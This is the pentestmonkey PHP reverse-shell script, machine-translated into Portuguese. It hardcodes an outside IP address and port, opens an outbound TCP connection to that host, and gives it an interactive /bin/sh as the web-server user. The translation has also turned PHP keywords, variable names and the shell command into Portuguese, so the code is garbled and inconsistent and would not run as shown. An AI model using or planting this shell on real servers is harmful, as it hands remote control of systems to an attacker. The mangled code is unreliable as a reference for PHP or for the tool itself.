<?php
// php-reverse-shell - Uma implementação de Shell Reverso em PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
// para quaisquer ações executadas usando esta ferramenta. O autor não assume nenhuma responsabilidade
// por danos causados ​​por esta ferramenta. Se estes termos não forem aceitáveis ​​para você, então
// não use esta ferramenta.
//
// Em todos os outros aspectos, a GPL versão 2 se aplica:
//
// Este programa é um software livre; você pode redistribuí-lo e/ou modificá-lo
// sob os termos da GNU General Public License versão 2 como
// publicado pela Free Software Foundation.
//
// Este programa é distribuído na esperança de que seja útil,
// mas SEM QUALQUER GARANTIA; sem mesmo a garantia implícita de
// COMERCIALIZAÇÃO ou ADEQUAÇÃO A UM DETERMINADO FIM. Veja o
// Licença Pública Geral GNU para mais detalhes.
//
// Você deve ter recebido uma cópia da GNU General Public License junto
// com este programa; caso contrário, escreva para a Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 EUA.
//
// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
// para quaisquer ações executadas usando esta ferramenta. Se estes termos não forem aceitáveis ​​para
// você, então não use esta ferramenta.
//
// Você é encorajado a enviar comentários, melhorias ou sugestões para
// eu em pentestmonkey@pentestmonkey.net
//
// Descrição
// -----------
// Este script fará uma conexão TCP de saída para um IP e porta codificados.
// O destinatário receberá um shell rodando como o usuário atual (normalmente apache).
//
// Limitações
// -----------
// proc_open e stream_set_blocking requerem PHP versão 4.3+, ou 5+
// O uso de stream_select() em descritores de arquivo retornados por proc_open() falhará e retornará FALSE no Windows.
// Algumas opções de tempo de compilação são necessárias para daemonização (como pcntl, posix). Estes raramente estão disponíveis.
//
// Uso
// -----
// Veja http://pentestmonkey.net/tools/php-reverse-shell se você ficar preso.

set_time_limit (0);
$VERSION = "1.0";
$ip = '141.255.158.126'; // MUDE ISSO
$porta = 4445; // MUDE ISSO
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname; W; Eu iria; /bin/sh -i';
$daemon = 0;
$depurar = 0;

//
// Nos demonizamos se possível para evitar zumbis mais tarde
//

// pcntl_fork quase nunca está disponível, mas nos permitirá daemonizar
// nosso processo php e evite zumbis. Vale a pena tentar...
if (function_exists('pcntl_fork')) {
	// Bifurca e faz com que o processo pai saia
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERRO: Não é possível bifurcar");
		saída(1);
	}
	
	if ($pid) {
		saída(0); // Pai sai
	}

	// Torna o processo atual um líder de sessão
	// Só terá sucesso se formos bifurcados
	if (posix_setsid() == -1) {
		printit("Erro: Impossível setid()");
		saída(1);
	}

	$daemon = 1;
} senão {
	printit("AVISO: Falha ao daemonizar. Isso é bastante comum e não fatal.");
}

// Muda para um diretório seguro
chdir("/");

// Remove qualquer umask que herdamos
umask(0);

//
//Faça o shell reverso...
//

//Abre a conexão reversa
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$meia) {
	printit("$errstr($errno)");
	saída(1);
}

// Gera processo de shell
$descriptorspec = array(
   0 => array("pipe", "r"), // stdin é um pipe do qual o filho irá ler
   1 => array("pipe", "w"), // stdout é um pipe no qual o filho escreverá
   2 => array("pipe", "w") // stderr é um pipe no qual o filho escreverá
);

$processo = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($processo)) {
	printit("ERRO: Não é possível gerar shell");
	saída(1);
}

// Configura tudo para não bloqueante
// Razão: Ocasionalmente as leituras serão bloqueadas, mesmo que stream_select nos diga que não
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Shell reverso aberto com sucesso para $ip:$port");

enquanto (1) {
	// Verifica o fim da conexão TCP
	if (feof($meia)) {
		printit("ERRO: A conexão do shell foi encerrada");
		parar;
	}

	// Verifica o fim do STDOUT
	if (feof($pipes[1])) {
		printit("ERRO: Processo do Shell finalizado");
		parar;
	}

	// Espera até que um comando termine $sock, ou algum
	// a saída do comando está disponível em STDOUT ou STDERR
	$read_a = array($meia, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// Se pudermos ler do soquete TCP, envie
	// dados para o STDIN do processo
	if (in_array($meia, $ler_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($meia, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $entrada);
	}

	// Se pudermos ler o STDOUT do processo
	// envia dados para baixo conexão tcp
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($meia, $entrada);
	}

	// Se pudermos ler o STDERR do processo
	// envia dados para baixo conexão tcp
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($meia, $entrada);
	}
}

fclose($meia);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($processo);

// Gosta de imprimir, mas não faz nada se nos daemonizarmos
// (não consigo descobrir como redirecionar STDOUT como um daemon adequado)
função printit($string) {
	if (!$daemon) {
		imprima "$string\n";
	}
}

?>


